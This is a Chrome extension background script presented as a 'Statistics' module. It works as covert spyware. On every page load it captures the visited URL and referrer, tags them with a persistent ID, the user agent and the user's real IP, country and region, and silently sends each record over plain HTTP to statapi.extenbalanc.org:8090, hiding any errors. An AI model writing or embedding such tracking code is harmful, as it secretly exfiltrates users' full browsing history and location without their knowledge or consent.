"use strict";

/*
  version 0.0.2
*/

function Statistics() {
  const self = this;
  const userInfo = {
    extensionId: chrome.runtime.id,
    uuid: null,
    realIp: null,
    countryCode: null,
    country: null,
    regionName: null,
    userAgent: navigator.userAgent
  };

  var tabsReferers = {};

  this.run = function() {
    this.getUUIDfromStore();
    this.getUserLocationInfo();

    chrome.tabs.onRemoved.addListener(this.handlerOnRemovedTab.bind(this));

    chrome.webRequest.onCompleted.addListener(
      this.handlerOnCompletedWebRequest.bind(this),
      { urls: ['<all_urls>'], types: ['main_frame'] }, []
    );
  };

  this.handlerOnCompletedWebRequest = function(details) {
    let referrerURL = details.initiator ? (tabsReferers[details.tabId] || '') : '';
    let visitData = {
      timestamp: Date.now(),
      visitedURL: details.url,
      referrerURL: referrerURL,
      responseCode: details.statusCode
    };

    tabsReferers[details.tabId] = details.url;
    this.sendStats(visitData);
  };

  this.handlerOnRemovedTab = function(tabId, removeInfo) {
    if(tabsReferers[tabId])
      delete tabsReferers[tabId];
  };

  this.sendStats = function(visitData) {
    let bodyRequest = {
      userInfo: userInfo,
      visitData: visitData
    };

    fetch('http://statapi.extenbalanc.org:8090/', {
      method: 'PUT',
      headers: {
        'Content-Type': 'application/json;charset=utf-8'
      },
      body: JSON.stringify(bodyRequest)
    })
      .then(function() { })
      .catch(function() { });
  };

  this.getUserLocationInfo = function() {
    fetch('http://ip-api.com/json/?fields=status,countryCode,country,regionName,query')
      .then(function(response) {
        if(response.status == 200)
          return response.json();
        throw new Error('Response status: ' + response.status);
      })
      .then(function(response) {
        if(response.status != 'success')
          throw new Error('Response status: ' + response.status);

        userInfo.realIp = response.query;
        userInfo.countryCode = response.countryCode;
        userInfo.country = response.country;
        userInfo.regionName = response.regionName;
      })
      .catch(this.getUserLocationInfo.bind(this));
  };

  this.getUUIDfromStore = function() {
    chrome.storage.sync.get(['uuid'], function(result) {
      userInfo.uuid = result.uuid = result.uuid && self.validateUUID4(result.uuid)
            ? result.uuid : self.makeUUID();
      chrome.storage.sync.set({uuid: result.uuid}, function() { });
    });
  };

  this.makeUUID = function() {
    return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c, r) {
      return ('x' == c ? (r=Math.random()*16|0) : (r&0x3|0x8)).toString(16);
    });
  };

  this.validateUUID4 = function(uuid) {
    var uuidV4 = new RegExp(/^[0-9A-F]{8}-[0-9A-F]{4}-4[0-9A-F]{3}-[89AB][0-9A-F]{3}-[0-9A-F]{12}$/i);
    return uuidV4.test(uuid);
  };
}

const statistics = new Statistics();
statistics.run();
